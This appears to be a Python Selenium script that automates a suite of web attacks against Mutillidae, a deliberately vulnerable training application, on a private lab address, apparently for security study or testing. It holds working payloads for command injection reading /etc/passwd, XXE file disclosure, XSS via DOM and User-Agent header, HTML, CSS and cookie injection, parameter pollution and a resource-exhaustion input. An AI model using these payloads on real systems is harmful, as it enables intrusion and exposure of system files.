"""
Kod którym posiłkowano się:
https://stackoverflow.com/questions/19003003/check-if-any-alert-exists-using-selenium-with-python
"""

from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from selenium.webdriver.common.by import By
from time import sleep
from modules.SeleniumDrivers import FirefoxBrowser, FirefoxBrowserSeleniumWire


def buffer_overflow(ip="192.168.255.133", sleep_time=0):
    browser = FirefoxBrowser().driver
    word_to_repeat = "hello"
    number_of_repeats = 200000000
    print(f"String to repeat: {word_to_repeat}")
    print(f"Number of repeats: {number_of_repeats}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=repeater.php")
        browser.find_element(By.NAME, "string_to_repeat").send_keys(word_to_repeat)
        browser.find_element(By.NAME, "times_to_repeat_string").send_keys(
            number_of_repeats
        )
        browser.find_element(By.NAME, "repeater-php-submit-button").click()
        sleep(sleep_time)
    except NoSuchElementException as e:
        print(e)
        return False

    try:
        browser.find_element(By.NAME, "string_to_repeat").send_keys("hello")
    except NoSuchElementException as e:
        print("Buffer Overflow succeeded")
        return True
    finally:
        browser.quit()
    return False


def css_injection(
    ip="192.168.255.133",
    sleep_time=0,
    payload='<style type="text/css">body { color: #40f4cd }</style>',
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=set-background-color.php")
        # browser.find_element(By.ID, "id_background_color").send_keys("<h1>infected</h1>")
        browser.find_element(By.ID, "id_background_color").send_keys(payload)
        browser.find_element(By.NAME, "set-background-color-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            element = browser.find_element(By.CLASS_NAME, "form-header")
            color = element.value_of_css_property("color")
            rgb = (
                color.replace("rgba(", "")
                .replace("rgb(", "")
                .replace(")", "")
                .split(",")[:3]
            )
            if rgb == ["64", " 244", " 205"]:
                print("CSS injection succeeded")
                return True
            return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def command_injection(
    ip="192.168.255.133",
    sleep_time=0,
    payload="127.0.0.1 && cat /etc/passwd",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=dns-lookup.php")
        browser.find_element(By.ID, "idTargetHostInput").send_keys(payload)
        browser.find_element(By.NAME, "dns-lookup-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            element = browser.find_element(By.XPATH, "//pre[@class='report-header']")
            if "Address" in element.text and "root:x:" in element.text:
                print("Command injection succeeded")
                return True
            return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def frame_source_injection(
    ip="192.168.255.133",
    sleep_time=0,
    payload="<iframe src=https://eportal.pwr.edu.pl/>",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=document-viewer.php&PathToDocument={payload}"
        )
        sleep(sleep_time)
        if verify_default_payload:
            browser.find_element(
                By.XPATH, "//iframe[contains(@src, 'eportal.pwr.edu.pl')]"
            )
            print("Frame source injection succeeded")
            return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def html_injection(
    ip="192.168.255.133",
    sleep_time=0,
    payload="%3Cimg%20src=%27https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg%27%3E",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
        )
        sleep(sleep_time)
        if verify_default_payload:
            browser.find_element(
                By.XPATH,
                "//img[@src='https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked!.jpg']",
            )
            print("HTML injection succeeded")
            return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def html_injection_via_cookie_into_phpsessid(
    ip="192.168.255.133",
    sleep_time=0,
    payload="<h1>infected</h1>",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=capture-data.php")
        initial_cookies = browser.get_cookies()
        print("Initial cookies:", initial_cookies)
        browser.add_cookie({"name": "PHPSESSID", "value": payload, "path": "/"})
        browser.refresh()
        updated_cookies = browser.get_cookies()
        print("Updated cookies:", updated_cookies)
        sleep(sleep_time)
        if verify_default_payload:
            browser.find_element(By.XPATH, "//h1[text()='infected']")
            print("HTML injection via cookie injection succeeded")
            return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def html_injection_via_dom_injection(
    ip="192.168.255.133",
    sleep_time=0,
    payload="%3C/script%3E%3Ch1%3Einfected%3C/h1%3E%3Cscript%3E",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
        )
        sleep(sleep_time)
        if verify_default_payload:
            browser.find_element(By.XPATH, "//h1[text()='infected']")
            print("HTML injection via DOM injection succeeded")
            return True
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def xss_injection_via_dom_injection(
    ip="192.168.255.133",
    sleep_time=0,
    payload='";alert(%27Hacked!%27);a="',
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
        )
        if verify_default_payload:
            WebDriverWait(browser, 3).until(
                EC.alert_is_present(),
                "Timed out waiting for PA creation " + "confirmation popup to appear.",
            )
            alert = browser.switch_to.alert
            print(f"Captured alert: {alert.text}")
            sleep(sleep_time)
            alert.accept()
            sleep(sleep_time)
            scripts = browser.find_elements(By.TAG_NAME, "script")
            for script in scripts:
                script_content = script.get_attribute("innerHTML")
                if "alert('Hacked!')" in script_content:
                    print("Script with the alert message found.")
                    print(f"Script content: {script_content}")
                    print("XSS injection via DOM injection succeeded")
                    return True
            return False
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def http_parameter_pollution(
    ip="192.168.255.133",
    sleep_time=0,
    payload="&choice=netcat",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=test{payload}&user-poll-php-submit-button=Submit+Vote&"
        )
        sleep(sleep_time)
        if verify_default_payload:
            element = browser.find_element(By.CLASS_NAME, "report-header")
            if "netcat" in element.text:
                print("HTTP parameter pollution succeeded")
                return True
            print("HTTP parameter pollution failed")
            return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def javascript_injection(
    ip="192.168.255.133",
    sleep_time=0,
    payload='";alert(1);a="',
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=password-generator.php&username={payload}"
        )
        if verify_default_payload:
            WebDriverWait(browser, 3).until(
                EC.alert_is_present(),
                "Timed out waiting for PA creation " + "confirmation popup to appear.",
            )
            alert = browser.switch_to.alert
            print(f"Captured alert: {alert.text}")
            sleep(sleep_time)
            alert.accept()
            sleep(sleep_time)
            scripts = browser.find_elements(By.TAG_NAME, "script")
            for script in scripts:
                script_content = script.get_attribute("innerHTML")
                if "alert(1)" in script_content:
                    print("Script with the alert message found.")
                    print(f"Script content: {script_content}")
                    print("javascript injection succeeded")
                    return True
            return False
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def xml_external_entity_injection(
    ip="192.168.255.133",
    sleep_time=0,
    payload="""<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd"
            >]><foo>&xxe;</foo>""",
    verify_default_payload=True,
):
    browser = FirefoxBrowser().driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(f"http://{ip}/mutillidae/index.php?page=xml-validator.php")
        browser.find_element(By.ID, "idXMLTextArea").send_keys(payload)
        browser.find_element(By.NAME, "xml-validator-php-submit-button").click()
        sleep(sleep_time)
        if verify_default_payload:
            element = browser.find_element(
                By.XPATH,
                "//fieldset/legend[text()='Text Content Parsed From XML']/following-sibling::div[@width='600px' and @reflectedxssexecutionpoint='1']",
            )
            if "root:x:" in element.text:
                print("XML external entity injection succeeded")
                return True
            return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


def xss_injection_via_http_header(
    ip="192.168.255.133",
    sleep_time=0,
    payload='"><script>alert(1);</script>',
    verify_default_payload=True,
):
    browser = FirefoxBrowser(headless=True).driver
    print(f"Payload to be used: {payload}")
    try:
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=site-footer-xss-discussion.php"
        )
        original_user_agent = browser.execute_script("return navigator.userAgent;")
        print(f"Original User-Agent: {original_user_agent}")

        modified_user_agent = original_user_agent + payload
        print(f"Modified User-Agent: {modified_user_agent}")
        browser.quit()
        browser = FirefoxBrowserSeleniumWire(user_agent=modified_user_agent).driver
        browser.get(
            f"http://{ip}/mutillidae/index.php?page=site-footer-xss-discussion.php"
        )
        if verify_default_payload:
            WebDriverWait(browser, 3).until(
                EC.alert_is_present(),
                "Timed out waiting for PA creation " + "confirmation popup to appear.",
            )
            alert = browser.switch_to.alert
            print(f"Captured alert: {alert.text}")
            sleep(sleep_time)
            alert.accept()
            sleep(sleep_time)
            print("XSS via HTTP headers succeeded")
            return True
    except UnexpectedAlertPresentException as e:
        print(e)
        return True
    except TimeoutException:
        return False
    except NoSuchElementException as e:
        print(e)
        return False
    finally:
        browser.quit()


if __name__ == "__main__":
    command_injection()
